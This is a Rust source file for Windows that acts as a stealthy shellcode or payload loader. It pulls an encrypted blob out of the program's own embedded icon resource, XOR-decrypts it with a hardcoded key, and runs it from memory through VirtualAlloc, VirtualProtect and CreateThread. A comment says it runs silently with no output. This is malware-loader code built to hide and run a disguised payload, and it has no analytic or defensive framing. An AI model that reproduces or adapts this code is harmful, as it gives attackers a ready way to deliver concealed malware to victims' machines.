use std::mem::transmute;
use std::ptr::{copy_nonoverlapping, null, null_mut};
use windows_sys::Win32::Foundation::WAIT_FAILED;
use windows_sys::Win32::System::Memory::*;
use windows_sys::Win32::System::Threading::{CreateThread, WaitForSingleObject};
use windows_sys::Win32::System::LibraryLoader::{GetModuleHandleA, FindResourceA, SizeofResource, LoadResource, LockResource};

fn decrypt_data(data: &[u8], key: &str) -> Vec<u8> {
    let mut decrypted_data = Vec::with_capacity(data.len());

    for (i, &byte) in data.iter().enumerate() {
        let key_byte = key.as_bytes()[i % key.len()];
        decrypted_data.push(byte ^ key_byte);
    }

    decrypted_data
}

fn extract_pe_from_ico(ico_data: &[u8]) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    if ico_data.len() < 22 {
        return Err("Invalid ICO file - too small".into());
    }

    // Skip ICO header (6 bytes) and image directory entry (16 bytes) = 22 bytes total
    let pe_data = &ico_data[22..];
    Ok(pe_data.to_vec())
}

fn main() {
    // Silent execution - no error messages or console output
    let key = "P Q R S T V X Y Z ";

    // Get the current executable's module handle
    let module_handle = unsafe { GetModuleHandleA(null()) };
    if module_handle == 0 {
        return;
    }

    // Load the embedded ICO resource
    let resource_data = unsafe {
        let resource_handle = FindResourceA(
            module_handle,
            1i32 as *const u8, // Resource ID 1
            14i32 as *const u8  // Resource type: RT_GROUP_ICON = 14
        );

        if resource_handle == 0 {
            return;
        }

        let resource_size = SizeofResource(module_handle, resource_handle);
        let resource_ptr = LoadResource(module_handle, resource_handle);

        if resource_ptr == 0 {
            return;
        }

        let resource_data_ptr = LockResource(resource_ptr);
        if resource_data_ptr == null_mut() {
            return;
        }

        std::slice::from_raw_parts(resource_data_ptr as *const u8, resource_size as usize)
    };

    // Extract PE data from ICO
    let encrypted_pe = match extract_pe_from_ico(resource_data) {
        Ok(data) => data,
        Err(_) => return,
    };

    // Decrypt the PE data
    let decrypted_pe = decrypt_data(&encrypted_pe, key);

    // Allocate memory and execute
    unsafe {
        let buffer = VirtualAlloc(
            null(),
            decrypted_pe.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );

        if buffer == null_mut() {
            return;
        }

        copy_nonoverlapping(decrypted_pe.as_ptr(), buffer.cast(), decrypted_pe.len());

        let mut oldprotect = PAGE_READWRITE;
        if VirtualProtect(buffer, decrypted_pe.len(), PAGE_EXECUTE, &mut oldprotect) == 0 {
            return;
        }

        let buffer_fn = transmute::<*mut std::ffi::c_void, extern "system" fn(*mut std::ffi::c_void) -> u32>(buffer);
        let thread = CreateThread(null(), 0, Some(buffer_fn), null(), 0, null_mut());

        if thread == 0 {
            return;
        }

        WaitForSingleObject(thread, WAIT_FAILED);
    }
}
